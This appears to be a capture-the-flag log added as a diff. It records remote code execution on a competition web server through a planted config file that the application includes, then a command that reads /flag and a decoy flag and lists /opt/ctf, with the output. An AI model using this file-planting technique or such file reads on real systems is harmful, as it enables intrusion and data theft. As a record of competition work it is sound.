@@ -1,0 +1,27 @@
+2026-10-31 14:47 CST
+Target: https://eci-2zehmcpck7adwc4zp3ma.cloudeci1.ichunqiu.com/
+Session: ocd7jpv81dop=68355a8fce1050da16de9580b7275e96
+RCE file: /var/www/html/config/qwb.config.php (included by lib/private/Config.php readData glob config/*.config.php)
+Identity: uid=33(www-data) gid=33(www-data) groups=33(www-data), host engine-1, cwd /var/www/html
+
+Command: cat /flag; echo; echo DECOY:; cat /opt/ctf/internal/flag.txt 2>&1; echo; ls -la /opt/ctf /opt/ctf/internal 2>&1
+Output:
+flag{dde3a1fd-625d-460c-a76d-246cd3e9a0d5}
+
+DECOY:
+flag{You_are_so_smart_8080}
+
+/opt/ctf:
+total 12
+drwxr-xr-x 1 www-data www-data 4096 Oct 30 17:29 .
+drwxr-xr-x 1 root     root     4096 Oct 30 17:29 ..
+drwxr-xr-x 1 www-data www-data 4096 Oct 30 16:24 internal
+
+/opt/ctf/internal:
+total 16
+drwxr-xr-x 1 www-data www-data 4096 Oct 30 16:24 .
+drwxr-xr-x 1 www-data www-data 4096 Oct 30 17:29 ..
+-rw-rw-rw- 1 www-data www-data 1407 Oct 30 16:24 flag.php
+-rw-r--r-- 1 www-data www-data   28 Sep  1 04:49 flag.txt
+
+/flag is -rw-r--r-- root root 43 bytes at /; real flag read directly as www-data.
